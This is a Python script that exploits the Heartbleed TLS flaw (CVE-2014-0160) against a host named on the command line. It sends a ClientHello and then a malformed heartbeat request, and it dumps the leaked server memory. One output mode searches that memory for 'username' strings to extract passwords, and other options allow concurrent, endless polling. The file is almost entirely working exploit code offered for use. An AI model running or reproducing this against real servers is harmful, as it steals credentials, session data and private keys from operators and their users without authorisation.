#!/bin/python3
#
# Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
#
# Author: Huang Yuzhong (hyzgog@gmail.com)
# Refer:  Jared Stafford (jspenguin@jspenguin.org)
# Refer:  Travis Lee

import asyncio
import binascii
import struct
import logging
import argparse

# tls_versions = {'TLSv1.0': '0x01', 'TLSv1.1': '0x02', 'TLSv1.2': '0x03'}

def hex2bin(array):
	return binascii.unhexlify(''.join('{:02x}'.format(x) for x in array))

def build_client_hello(tls_ver = 0x01):
	return [
# TLS header ( 5 bytes)
0x16,               # Content type (0x16 for handshake)
0x03, tls_ver,      # TLS Version
0x00, 0xdc,         # Length
# Handshake header
0x01,               # Type (0x01 for ClientHello)
0x00, 0x00, 0xd8,   # Length
0x03, tls_ver,      # TLS Version
# Random (32 byte)
0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
0x00,               # Session ID length
0x00, 0x66,         # Cipher suites length
# Cipher suites (51 suites)
0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
0x01,               # Compression methods length
0x00,               # Compression method (0x00 for NULL)
0x00, 0x49,         # Extensions length
# Extension: ec_point_formats
0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
# Extension: elliptic_curves
0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
# Extension: SessionTicket TLS
0x00, 0x23, 0x00, 0x00,
# Extension: Heartbeat
0x00, 0x0f, 0x00, 0x01, 0x01
	]

def build_heartbeat(tls_ver = 0x01):
	return [
0x18,       	# Content Type (Heartbeat)
0x03, tls_ver,  # TLS version
0x00, 0x03,		# Length
# Payload
0x01,			# Type (Request)
0x40, 0x00		# Payload length
	] 

# data bytes
client_hello = hex2bin(build_client_hello())
heartbeat = hex2bin(build_heartbeat())

# global active count
active = 0

def hexdump(s):
	for b in range(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % c for c in lin)
		pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
		print( '  %04x: %-48s %s' % (b, hxdat, pdat))

def textdump(s):
	print(''.join(chr(c) for c in s if 32 <= c <= 126))

def passdump(s):
	buf = ''.join(chr(c) for c in s if 32 <= c <= 126)
	left = buf.find('username')
	if left != -1:
		print(buf[left:])

@asyncio.coroutine
def recvMessage(reader):
	header = yield from reader.read(5)
	if header is None:
		logging.warning('Unexpected EOF receiving record header - server closed connection')
		return None, None, None

	typ, ver, length = struct.unpack('!BHH', header)

	payload = yield from reader.read(length)
	if payload is None:
		logging.warning('Unexpected EOF receiving record payload - server closed connection')
		return None, None, None

	logging.info(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(payload)))
	return typ, ver, payload

@asyncio.coroutine
def bleed(host, port = 443, concurrency = 1, forever = False):
	# init, increase active count
	global active
	active += 1

	if active < concurrency:
		asyncio.async(bleed(host, port, concurrency, forever))

	reader, writer = yield from asyncio.open_connection(host, port, loop = loop)
	writer.write(client_hello)

	while True:
		typ, ver, payload = yield from recvMessage(reader)

		if typ == None:
			logging.error('Server closed connection without sending Server Hello.')
			return

		# Look for server hello done message.
		if typ == 22 and payload[0] == 0x0E:
			break

	logging.info('Sending heartbeat request...')
	writer.write(heartbeat)

	typ, ver, payload = yield from recvMessage(reader)

	if typ is None:
		logging.error('No heartbeat response received, server likely not vulnerable')
	elif typ == 24:
		logging.info('Received heartbeat response:')
		dump(payload)
		if len(payload) > 3:
			logging.warning('Server returned more data than it should - server is vulnerable!')
		else:
			logging.warning('Server processed malformed heartbeat, but did not return any extra data.')
	elif typ == 21:
		logging.warning('Received alert:')
		dump(payload)
		logging.error('Server returned error, likely not vulnerable')
	else:
		logging.error('Unknown response type')

	# Done, check for next task
	active -= 1
	if forever:
		if active < concurrency:
			asyncio.async(bleed(host, port, concurrency, forever))
	else:
		if active == 0:
			loop.stop()

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')
	parser.add_argument('host', help='Host to test')
	parser.add_argument('-p', '--port', type=int, default=443, help='TCP port to test')
	parser.add_argument('-o', '--output', default='text', choices=['password', 'text', 'hex'], help='Output')
	parser.add_argument('-c', '--concurrency', type=int, default=1, help='Concurrency')
	parser.add_argument('-f', '--forever', action='store_true', default=False, help='Forever')

	option = parser.parse_args()
	if option.output == 'password':
		dump = passdump
		logging.basicConfig(level=logging.ERROR)
	elif option.output == 'text':
		dump = textdump
		logging.basicConfig(level=logging.ERROR)
	elif option.output == 'hex':
		dump = hexdump
		logging.basicConfig(level=logging.INFO)

	loop = asyncio.get_event_loop()
	asyncio.async(bleed(option.host, option.port, option.concurrency, option.forever))
	loop.run_forever()
	loop.close()
